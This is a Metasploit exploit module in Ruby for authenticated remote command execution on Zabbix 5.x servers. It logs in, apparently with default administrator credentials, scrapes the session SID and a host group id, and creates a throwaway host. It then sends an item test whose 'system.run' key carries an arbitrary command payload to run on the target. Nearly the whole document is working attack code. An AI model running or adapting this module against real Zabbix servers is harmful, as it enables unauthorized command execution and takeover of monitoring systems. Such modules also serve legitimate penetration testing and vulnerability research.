##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Zabbix Authenticated Remote Command Execution 5.x',
      'Description'    => %q{
      ZABBIX allows an administrator to run commands trough a directive called 'system.run', 
      this module create a host and create an item in this host to run a command with the help 
      of that directive.

      This module was tested against Zabbix v5.0.17 and v5.0.19.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>', # Discovery / msf module
          'Lap1nou <https://github.com/lap1nou>' # Update for version > 5.0
        ],
      'References'     =>
        [
          ['URL', 'https://www.zabbix.com/documentation/current/en/manual/config/notifications/action/operation/remote_command']
        ],
      'Payload'        =>
      {
        'Compat'     =>
        {
          'PayloadType'  => 'cmd',
          'RequiredCmd'  => 'generic perl ruby telnet python',
        }
      },
      'Platform'       => ['unix', 'linux'],
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Automatic',{}]],
      'DisclosureDate' => '',
      'DefaultTarget'  => 0
    ))

    register_options(
    [
      OptString.new('USERNAME', [ true, "Username to authenticate with", 'Admin']),
      OptString.new('PASSWORD', [ true, "Password to authenticate with", 'zabbix']),
      OptString.new('TARGETURI', [ true, "The URI of the Zabbix installation", '/zabbix/']),
      OptString.new('TLS_PSK_IDENTITY', [ false, "The TLS identity", '']),
      OptString.new('TLS_PSK', [ false, "The TLS PSK", ''])
    ])
  end

  def exploit
    c = connect

    req = c.request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php'),
      'data' => "request=&name=#{datastore['USERNAME']}&password=#{datastore['PASSWORD']}&enter=Sign+in"
    })

    login = c.send_recv(req.to_s.sub("Host:", "Host: " << ''))  

    if !login or login.code != 302
      fail_with(Failure::NoAccess, "Login failed")
    end
    
    print_good('Succesfully connected on Zabbix !')

    sess = login.get_cookies

    dash = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/hosts.php'),
      'cookie' => sess
    })
    
    if !dash or dash.code != 200
      fail_with(Failure::UnexpectedReply, "Dashboard failed")
    end

    print_status('Getting SID...')

    sid = ''
    dash.body.each_line do |line|
      if line =~ /&sid=(.{16})\'/
        sid = $1
        break
      end
    end

    if sid == ''
      fail_with(Failure::UnexpectedReply, "Could not get sid")
    end

    print_status('Getting a valid group id...')

    group = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/hostgroups.php'),
      'cookie' => sess
    })

    groupid = ''
    group.body.each_line do |line|
      if line =~ /hostgroups.php\?form=update&groupid=(.{1,3})\">/
        groupid = $1
        break
      end
    end

    if groupid == ''
      fail_with(Failure::UnexpectedReply, "Could not get group id")
    end

    host = rand_text_alpha(18)
    print_status("Creating a host named: #{host}")
    post = {
        'sid' => sid,
        'form_refresh' => 2,
        'form' => 'create',
        'flags' => 0,
        'tls_connect' => 2,
        'host' => host,
        'visiblename' => '',
        'groups[]' => groupid,
        'interfaces[1][isNew]' => true,
        'interfaces[1][interfaceid]' => 1,
        'interfaces[1][type]' => 1,
        'interfaces[1][ip]' => '127.0.0.1',
        'interfaces[1][dns]' => '',
        'interfaces[1][useip]' => 1,
        'interfaces[1][port]' => 10050,
        'mainInterfaces[1]' => 1,
        'proxy_hostid' => 0,
        'status' => 0,
        'ipmi_authtype' => -1,
        'ipmi_privilege' => 2,
        'ipmi_username' => '',
        'ipmi_password' => '',
        'tags[0][tag]' => '',
        'tags[0][value]' => '',
        'show_inherited_macros' => 0,
        'macros[0][macro]' => '',
        'macros[0][value]' => '',
        'macros[0][type]' => 0,
        'inventory_mode' => -1,
        'tls_connect' => 2,
        'tls_psk_identity' => datastore['TLS_PSK_IDENTITY'],
        'tls_psk' => datastore['TLS_PSK'],
        'tls_issuer' => '',
        'tls_subject' => '',
        'add' => 'Add'
      }
    
    # We must modify the POST request depending on the TLS parameters
    if datastore['TLS_PSK_IDENTITY'] != ''
      post[:tls_connect] = 2
      post[:tls_in_psk] = 1
      post[:tls_accept] = 2
    else
      post['tls_connect'] = 1
      post[:tls_in_none] = 1
      post[:tls_accept] = 1
    end

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/hosts.php'),
      'vars_post' => post,
      'cookie' => sess
    })

    if !resp or resp.code != 200
      fail_with(Failure::UnexpectedReply, "Error creating new host")
    end

    hostid = ''
    if resp.body =~ /hosts.php\?form=update&hostid=(\d{1,12})\">#{host}/
      hostid = $1
    else
      fail_with(Failure::UnexpectedReply, "Could not get the host id")
    end

    post = {
      'key' => "system.run[#{payload.encoded} ,nowait]",
      'delay' => '',
      'value_type' => 4,
      'item_type' => 0,
      'itemid' => 0,
      'interfaceid' => 0,
      'get_value' => 1,
      'interface[address]' => '127.0.0.1',
      'interface[port]' => 10050,
      'proxy_hostid' => 0,
      'show_final_result' => 1,
      'test_type' => 0,
      'hostid' => hostid,
      'valuemapid' => 0
    }

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, "/zabbix.php?sid=#{sid}&action=popup.itemtest.send"),
      'vars_post' => post,
      'cookie' => sess
    })

  end
end

